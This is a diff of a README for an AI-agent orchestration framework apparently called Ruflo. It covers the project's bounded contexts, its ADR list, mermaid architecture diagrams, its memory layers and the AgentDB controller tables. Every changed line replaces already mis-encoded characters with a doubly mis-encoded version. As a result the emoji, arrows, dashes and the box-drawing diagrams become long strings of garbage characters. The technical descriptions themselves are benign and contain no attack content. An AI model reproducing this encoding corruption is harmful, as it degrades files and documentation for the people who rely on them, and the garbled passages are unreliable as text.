+| ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ¢â‚¬Å¾ **Living Documentation** | ADRs update automatically as requirements evolve |
 
 **Specification Features:**
 
@@ -919,17 +919,17 @@ Complex projects fail when implementation drifts from the original plan. Ruflo s
 
 **DDD Bounded Contexts:**
 ```
-Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â  Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â  Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â
-Ã¢â€â€š    Core     Ã¢â€â€š  Ã¢â€â€š   Memory    Ã¢â€â€š  Ã¢â€â€š  Security   Ã¢â€â€š
-Ã¢â€â€š  Agents,    Ã¢â€â€š  Ã¢â€â€š  AgentDB,   Ã¢â€â€š  Ã¢â€â€š  AIDefence, Ã¢â€â€š
-Ã¢â€â€š  Swarms,    Ã¢â€â€š  Ã¢â€â€š  HNSW,      Ã¢â€â€š  Ã¢â€â€š  Validation Ã¢â€â€š
-Ã¢â€â€š  Tasks      Ã¢â€â€š  Ã¢â€â€š  Cache      Ã¢â€â€š  Ã¢â€â€š  CVE Fixes  Ã¢â€â€š
-Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ  Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ  Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ
-Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â  Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â
-Ã¢â€â€š Integration Ã¢â€â€š  Ã¢â€â€šCoordination Ã¢â€â€š
-Ã¢â€â€š agentic-    Ã¢â€â€š  Ã¢â€â€š  Consensus, Ã¢â€â€š
-Ã¢â€â€š flow,MCP    Ã¢â€â€š  Ã¢â€â€š  Hive-Mind  Ã¢â€â€š
-Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ  Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â  ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â  ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    Core     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   Memory    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  Security   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  Agents,    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  AgentDB,   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  AIDefence, ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  Swarms,    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  HNSW,      ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  Validation ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  Tasks      ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  Cache      ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  CVE Fixes  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â  ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Integration ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡Coordination ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ agentic-    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  Consensus, ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ flow,MCP    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  Hive-Mind  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“
 ```
 
 **Key ADRs:**
@@ -938,44 +938,44 @@ Complex projects fail when implementation drifts from the original plan. Ruflo s
 - **ADR-008**: Vitest testing framework (10x faster than Jest)
 - **ADR-009**: Hybrid Memory Backend (SQLite + HNSW)
 - **ADR-026**: Intelligent 3-tier model routing
-- **ADR-048**: Auto Memory Bridge (Claude Code Ã¢â€ â€ AgentDB bidirectional sync)
+- **ADR-048**: Auto Memory Bridge (Claude Code ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬Â AgentDB bidirectional sync)
 - **ADR-049**: Self-Learning Memory with GNN (LearningBridge, MemoryGraph, AgentMemoryScope)
 
 </details>
 
 ---
 
-### Ã°Å¸Ââ€”Ã¯Â¸Â Architecture Diagrams
+### ÃƒÂ°Ã…Â¸Ã‚ÂÃ¢â‚¬â€ÃƒÂ¯Ã‚Â¸Ã‚Â Architecture Diagrams
 
 <details>
-<summary>Ã°Å¸â€œÅ  <strong>System Overview</strong> Ã¢â‚¬â€ High-level architecture</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã…Â  <strong>System Overview</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â High-level architecture</summary>
 
 ```mermaid
 flowchart TB
-    subgraph User["Ã°Å¸â€˜Â¤ User Layer"]
+    subgraph User["ÃƒÂ°Ã…Â¸Ã¢â‚¬ËœÃ‚Â¤ User Layer"]
         CC[Claude Code]
         CLI[CLI Commands]
     end
 
-    subgraph Orchestration["Ã°Å¸Å½Â¯ Orchestration Layer"]
+    subgraph Orchestration["ÃƒÂ°Ã…Â¸Ã…Â½Ã‚Â¯ Orchestration Layer"]
         MCP[MCP Server]
         Router[Intelligent Router]
         Hooks[Self-Learning Hooks]
     end
 
-    subgraph Agents["Ã°Å¸Â¤â€“ Agent Layer"]
+    subgraph Agents["ÃƒÂ°Ã…Â¸Ã‚Â¤Ã¢â‚¬â€œ Agent Layer"]
         Queen[Queen Coordinator]
         Workers[100+ Specialized Agents]
         Swarm[Swarm Manager]
     end
 
-    subgraph Intelligence["Ã°Å¸Â§Â  Intelligence Layer"]
+    subgraph Intelligence["ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  Intelligence Layer"]
         SONA[SONA Learning]
         MoE[Mixture of Experts]
         HNSW[HNSW Vector Search]
     end
 
-    subgraph Providers["Ã¢ËœÂÃ¯Â¸Â Provider Layer"]
+    subgraph Providers["ÃƒÂ¢Ã‹Å“Ã‚ÂÃƒÂ¯Ã‚Â¸Ã‚Â Provider Layer"]
         Anthropic[Anthropic]
         OpenAI[OpenAI]
         Google[Google]
@@ -996,7 +996,7 @@ flowchart TB
 </details>
 
 <details>
-<summary>Ã°Å¸â€â€ž <strong>Request Flow</strong> Ã¢â‚¬â€ How tasks are processed</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ¢â‚¬Å¾ <strong>Request Flow</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â How tasks are processed</summary>
 
 ```mermaid
 sequenceDiagram
@@ -1036,29 +1036,29 @@ sequenceDiagram
 </details>
 
 <details>
-<summary>Ã°Å¸Â§Â  <strong>Memory Architecture</strong> Ã¢â‚¬â€ How knowledge is stored, learned, and retrieved</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  <strong>Memory Architecture</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â How knowledge is stored, learned, and retrieved</summary>
 
 ```mermaid
 flowchart LR
-    subgraph Input["Ã°Å¸â€œÂ¥ Input"]
+    subgraph Input["ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã‚Â¥ Input"]
         Query[Query/Pattern]
         Insight[New Insight]
     end
 
-    subgraph Processing["Ã¢Å¡â„¢Ã¯Â¸Â Processing"]
+    subgraph Processing["ÃƒÂ¢Ã…Â¡Ã¢â€žÂ¢ÃƒÂ¯Ã‚Â¸Ã‚Â Processing"]
         Embed[ONNX Embeddings]
         Normalize[Normalization]
         Learn[LearningBridge<br/>SONA + ReasoningBank]
     end
 
-    subgraph Storage["Ã°Å¸â€™Â¾ Storage"]
+    subgraph Storage["ÃƒÂ°Ã…Â¸Ã¢â‚¬â„¢Ã‚Â¾ Storage"]
         HNSW[(HNSW Index<br/>150x faster)]
         SQLite[(SQLite Cache)]
         AgentDB[(AgentDB)]
         Graph[MemoryGraph<br/>PageRank + Communities]
     end
 
-    subgraph Retrieval["Ã°Å¸â€Â Retrieval"]
+    subgraph Retrieval["ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ‚Â Retrieval"]
         Vector[Vector Search]
         Semantic[Semantic Match]
         Rank[Graph-Aware Ranking]
@@ -1087,12 +1087,12 @@ flowchart LR
 | **LearningBridge** | Connects insights to SONA/ReasoningBank neural pipeline | 0.12 ms/insight |
 | **MemoryGraph** | PageRank + label propagation knowledge graph | 2.78 ms build (1k nodes) |
 | **AgentMemoryScope** | 3-scope agent memory (project/local/user) with cross-agent transfer | 1.25 ms transfer |
-| **AutoMemoryBridge** | Bidirectional sync: Claude Code auto memory files Ã¢â€ â€ AgentDB | ADR-048 |
+| **AutoMemoryBridge** | Bidirectional sync: Claude Code auto memory files ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬Â AgentDB | ADR-048 |
 
 </details>
 
 <details>
-<summary>Ã°Å¸Â§Â  <strong>AgentDB v3 Controllers</strong> Ã¢â‚¬â€ 20+ intelligent memory controllers</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  <strong>AgentDB v3 Controllers</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â 20+ intelligent memory controllers</summary>
 
 Ruflo V3 integrates AgentDB v3 (3.0.0-alpha.13) providing 20+ memory controllers accessible via MCP tools and the CLI. As of `@claude-flow/cli@3.7.0-alpha.8`, the integration includes the new Cypher-routed delete API (`deleteNode`, `deleteEdge`, `deleteEdgesByEndpoints`, `deleteHyperedge`, plus `ReflexionMemory.deleteEpisode`) for full re-index support.
 
@@ -1100,7 +1100,7 @@ Ruflo V3 integrates AgentDB v3 (3.0.0-alpha.13) providing 20+ memory controllers
 
 | Controller | MCP Tool | Description |
 |-----------|----------|-------------|
-| HierarchicalMemory | `agentdb_hierarchical-store/recall` | Working Ã¢â€ â€™ episodic Ã¢â€ â€™ semantic memory tiers with Ebbinghaus forgetting curves and spaced repetition |
+| HierarchicalMemory | `agentdb_hierarchical-store/recall` | Working ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ episodic ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ semantic memory tiers with Ebbinghaus forgetting curves and spaced repetition |
 | MemoryConsolidation | `agentdb_consolidate` | Automatic clustering and merging of related memories into semantic summaries |
 | BatchOperations | `agentdb_batch` | Bulk insert/update/delete operations for high-throughput memory management |
 | ReasoningBank | `agentdb_pattern-store/search` | Pattern storage with BM25+semantic hybrid search |
@@ -1111,32 +1111,32 @@ Ruflo V3 integrates AgentDB v3 (3.0.0-alpha.13) providing 20+ memory controllers
 |-----------|----------|-------------|
 | SemanticRouter | `agentdb_semantic-route` | Route tasks to agents using vector similarity instead of manual rules |
 | ContextSynthesizer | `agentdb_context-synthesize` | Auto-generate context summaries from memory entries |
-| GNNService | Ã¢â‚¬â€ | Graph neural network for intent classification and skill recommendation |
-| SonaTrajectoryService | Ã¢â‚¬â€ | Record and predict learning trajectories for agents |
-| GraphTransformerService | Ã¢â‚¬â€ | Sublinear attention, causal attention, Granger causality extraction |
+| GNNService | ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â | Graph neural network for intent classification and skill recommendation |
+| SonaTrajectoryService | ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â | Record and predict learning trajectories for agents |
+| GraphTransformerService | ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â | Sublinear attention, causal attention, Granger causality extraction |
 
 **Causal & Explainable:**
 
 | Controller | MCP Tool | Description |
 |-----------|----------|-------------|
 | CausalRecall | `agentdb_causal-edge` | Recall with causal re-ranking and utility scoring |
-| ExplainableRecall | Ã¢â‚¬â€ | Certificates proving *why* a memory was recalled |
-| CausalMemoryGraph | Ã¢â‚¬â€ | Directed causal relationships between memory entries |
-| MMRDiversityRanker | Ã¢â‚¬â€ | Maximal Marginal Relevance for diverse search results |
+| ExplainableRecall | ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â | Certificates proving *why* a memory was recalled |
+| CausalMemoryGraph | ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â | Directed causal relationships between memory entries |
+| MMRDiversityRanker | ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â | Maximal Marginal Relevance for diverse search results |
 
 **Security & Integrity:**
 
 | Controller | MCP Tool | Description |
 |-----------|----------|-------------|
-| GuardedVectorBackend | Ã¢â‚¬â€ | Cryptographic proof-of-work before vector insert/search |
-| MutationGuard | Ã¢â‚¬â€ | Token-validated mutations with cryptographic proofs |
-| AttestationLog | Ã¢â‚¬â€ | Immutable audit trail of all memory operations |
+| GuardedVectorBackend | ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â | Cryptographic proof-of-work before vector insert/search |
+| MutationGuard | ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â | Token-validated mutations with cryptographic proofs |
+| AttestationLog | ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â | Immutable audit trail of all memory operations |
 
 **Optimization:**
 
 | Controller | MCP Tool | Description |
 |-----------|----------|-------------|
-| RVFOptimizer | Ã¢â‚¬â€ | 4-bit adaptive quantization and progressive compression |
+| RVFOptimizer | ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â | 4-bit adaptive quantization and progressive compression |
 
 **MCP Tool Examples:**
 ```bash
@@ -1161,44 +1161,44 @@ agentdb_semantic-route --input "fix auth bug in login"
 
 **Hierarchical Memory Tiers:**
 ```
-Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â
-Ã¢â€â€š  Working Memory                             Ã¢â€â€š  Ã¢â€ Â Active context, fast access
-Ã¢â€â€š  Size-based eviction (1MB limit)            Ã¢â€â€š
